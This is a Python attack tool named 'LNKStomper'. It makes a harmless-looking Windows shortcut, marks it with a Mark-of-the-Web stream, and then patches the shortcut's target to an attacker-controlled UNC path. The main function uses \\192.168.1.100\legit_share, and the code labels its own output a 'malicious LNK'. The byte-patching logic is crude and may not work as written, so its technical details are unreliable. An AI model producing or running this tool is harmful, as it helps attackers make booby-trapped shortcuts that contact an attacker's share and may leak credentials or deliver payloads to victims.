import os
import struct
import sys
import time
import random
import string
import logging
from pylnk3 import LNK
from typing import Optional, Tuple

class LNKStomper:
    def __init__(self, log_level: int = logging.INFO):
        """
        Initialize the LNK stomper with logging capabilities.
        
        Args:
            log_level: Logging level (default: INFO)
        """
        self.logger = logging.getLogger('LNKStomper')
        self.logger.setLevel(log_level)
        
        # Add console handler if not already present
        if not self.logger.handlers:
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
            self.logger.addHandler(console_handler)
    
    def _generate_random_filename(self, length: int = 8) -> str:
        """Generate a random filename for the LNK file."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length)) + '.lnk'
    
    def _create_benign_lnk(self, lnk_path: str, target_path: str = None) -> bool:
        """
        Create a benign LNK file with MOTW (Mark of the Web).
        
        Args:
            lnk_path: Path where to create the LNK file
            target_path: Optional target path (default: calc.exe)
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            target = target_path or r"C:\Windows\System32\calc.exe"
            work_dir = os.path.dirname(target)
            
            lnk = LNK()
            lnk.target = target
            lnk.work_dir = work_dir
            lnk.icon = r"%SystemRoot%\System32\shell32.dll,0"
            lnk.save(lnk_path)
            
            # Add MOTW (Zone.Identifier ADS)
            with open(f"{lnk_path}:Zone.Identifier", "w") as f:
                f.write("[ZoneTransfer]\nZoneId=3")  # "Internet" zone
            
            self.logger.info(f"Created benign LNK file at {lnk_path}")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to create benign LNK: {e}")
            return False
    
    def _stomp_lnk_with_unc(self, lnk_path: str, attacker_unc: str) -> bool:
        """
        Stomp the LNK file with UNC path while preserving MOTW.
        
        Args:
            lnk_path: Path to the LNK file
            attacker_unc: UNC path to inject
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            with open(lnk_path, "r+b") as f:
                content = f.read()
                
                # Convert UNC path to UTF-16LE
                new_target = attacker_unc.encode("utf-16le")
                new_target_header = struct.pack("<I", len(new_target) + 2)  # Block size header
                
                # Find and overwrite the target ID list
                target_id_offset = content.find(b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 0x4C)
                if target_id_offset != -1:
                    f.seek(target_id_offset)
                    f.write(new_target_header + new_target + b"\x00\x00")  # Append null terminator
                    self.logger.info(f"Successfully stomped LNK with UNC path: {attacker_unc}")
                    return True
                else:
                    self.logger.error("Could not find target ID list in LNK file")
                    return False
                    
        except Exception as e:
            self.logger.error(f"Failed to stomp LNK file: {e}")
            return False
    
    def _verify_lnk(self, lnk_path: str) -> bool:
        """
        Verify the LNK file is valid and contains the expected content.
        
        Args:
            lnk_path: Path to the LNK file
            
        Returns:
            bool: True if valid, False otherwise
        """
        try:
            # Check if file exists
            if not os.path.exists(lnk_path):
                self.logger.error("LNK file does not exist")
                return False
            
            # Check if MOTW exists
            if not os.path.exists(f"{lnk_path}:Zone.Identifier"):
                self.logger.error("MOTW not found")
                return False
            
            # Try to load the LNK file
            lnk = LNK()
            lnk.load(lnk_path)
            
            self.logger.info("LNK file verification successful")
            return True
            
        except Exception as e:
            self.logger.error(f"LNK verification failed: {e}")
            return False
    
    def create_malicious_lnk(self, output_dir: str, attacker_unc: str, 
                           target_path: Optional[str] = None) -> Tuple[bool, str]:
        """
        Create a malicious LNK file with UNC path.
        
        Args:
            output_dir: Directory to save the LNK file
            attacker_unc: UNC path to inject
            target_path: Optional target path for benign LNK
            
        Returns:
            Tuple[bool, str]: (Success status, Path to created LNK file)
        """
        try:
            # Generate random filename
            lnk_filename = self._generate_random_filename()
            lnk_path = os.path.join(output_dir, lnk_filename)
            
            # Create benign LNK first
            if not self._create_benign_lnk(lnk_path, target_path):
                return False, ""
            
            # Stomp with UNC path
            if not self._stomp_lnk_with_unc(lnk_path, attacker_unc):
                return False, ""
            
            # Verify the result
            if not self._verify_lnk(lnk_path):
                return False, ""
            
            self.logger.info(f"Successfully created malicious LNK at {lnk_path}")
            return True, lnk_path
            
        except Exception as e:
            self.logger.error(f"Failed to create malicious LNK: {e}")
            return False, ""

def main():
    """Main execution function."""
    # Initialize LNK stomper with debug logging
    stomper = LNKStomper(log_level=logging.DEBUG)
    
    # Example usage
    output_dir = os.getcwd()  # Current directory
    attacker_unc = r"\\192.168.1.100\legit_share"  # Example UNC path
    
    success, lnk_path = stomper.create_malicious_lnk(
        output_dir=output_dir,
        attacker_unc=attacker_unc
    )
    
    if success:
        print(f"Successfully created malicious LNK at: {lnk_path}")
    else:
        print("Failed to create malicious LNK")

if __name__ == "__main__":
    main()